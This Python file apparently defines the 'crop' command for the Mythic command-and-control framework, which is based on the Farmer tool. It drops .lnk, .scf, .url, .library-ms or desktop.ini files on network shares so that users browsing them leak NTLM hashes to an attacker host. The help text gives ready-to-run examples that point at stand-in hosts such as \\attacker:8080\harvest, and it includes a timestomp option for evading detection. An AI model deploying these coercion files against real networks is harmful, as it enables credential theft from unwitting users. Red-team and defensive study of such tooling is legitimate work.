from mythic_container.MythicRPC import *
from mythic_container.MythicCommandBase import *

class FarmerArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="targetLocation",
                type=ParameterType.String,
                description="The location to drop the file",
                parameter_group_info=[ParameterGroupInfo(
                        required=True,
                        ui_position=0,
                        group_name="Default"
                    ),
                ],
            ),
            CommandParameter(
                name="targetFilename",
                type=ParameterType.String,
                description="The filename (.lnk, .url, .library-ms, .searchconnector-ms, .scf, desktop.ini)",
                parameter_group_info=[ParameterGroupInfo(
                        required=True,
                        ui_position=1,
                        group_name="Default"
                    ),
                ],
            ),
            CommandParameter(
                name="targetPath",
                type=ParameterType.String,
                description="UNC/WebDAV path for coercion target (e.g. \\\\attacker@80\\share)",
                parameter_group_info=[ParameterGroupInfo(
                        required=True,
                        ui_position=2,
                        group_name="Default"
                    ),
                ],
            ),
            CommandParameter(
                name="targetIcon",
                type=ParameterType.String,
                description="LNK Icon location (required for .lnk files)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(
                        required=False,
                        ui_position=3,
                        group_name="Default"
                    ),
                ],
            ),
            CommandParameter(
                name="recurse",
                type=ParameterType.Boolean,
                default_value=False,
                description="Write the file to every sub folder of the specified path",
                parameter_group_info=[ParameterGroupInfo(
                        required=False,
                        ui_position=4,
                        group_name="Default"
                    ),
                ],
            ),
            CommandParameter(
                name="clean",
                type=ParameterType.Boolean,
                default_value=False,
                description="Remove the file from every sub folder of the specified path",
                parameter_group_info=[ParameterGroupInfo(
                        required=False,
                        ui_position=5,
                        group_name="Default"
                    ),
                ],
            ),
            CommandParameter(
                name="timestomp",
                type=ParameterType.Boolean,
                default_value=False,
                description="Copy timestamps from a neighboring file to blend in",
                parameter_group_info=[ParameterGroupInfo(
                        required=False,
                        ui_position=6,
                        group_name="Default"
                    ),
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("port", self.command_line.split()[0])
        else:
            raise ValueError("Missing arguments")


class FarmerCommand(CommandBase):
    cmd = "crop"
    needs_admin = False
    help_cmd = "crop"
    description = "Drop a file for hash collection"
    version = 2
    help_cmd = """Crop https://github.com/mdsecactivebreach/Farmer
    created by @domchell

Crop creates files that force NTLM authentication when users browse a folder.

Supported file types:
  .lnk                 - Shortcut with icon pointing to UNC path
  .url                 - Internet shortcut (CVE-2024-43451 style)
  .library-ms          - Library definition (CVE-2025-24054 style)
  .searchconnector-ms  - Search connector
  .scf                 - Shell Command File (triggers on folder browse)
  desktop.ini          - Folder customization (sets System attribute on folder)

Options:
  -targetLocation    Share/folder to drop the file
  -targetFilename    Filename with extension (determines file type)
  -targetPath        UNC/WebDAV path for coercion
  -targetIcon        Icon path (required for .lnk only)
  -recurse           Drop in all subdirectories
  -clean             Remove previously dropped files
  -timestomp         Copy timestamps from neighboring file

Drop an LNK file:
  crop -targetLocation \\\\server\\share\\ -targetFilename @coerce.lnk -targetPath \\\\attacker:8080\\harvest -targetIcon \\\\attacker:8080\\harvest\\icon.ico

Drop an SCF file (triggers on folder browse):
  crop -targetLocation \\\\server\\share\\ -targetFilename @coerce.scf -targetPath \\\\attacker@80\\harvest -timestomp true

Drop desktop.ini (auto-sets System attribute):
  crop -targetLocation \\\\server\\share\\ -targetFilename desktop.ini -targetPath \\\\attacker@80\\harvest -timestomp true

Clean up:
  crop -targetLocation \\\\server\\share\\ -targetFilename @coerce.scf -targetPath x -clean true -recurse true"""
    author = "@domchell, @checkymander"
    argument_class = FarmerArguments
    attackmapping = ["T1187"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
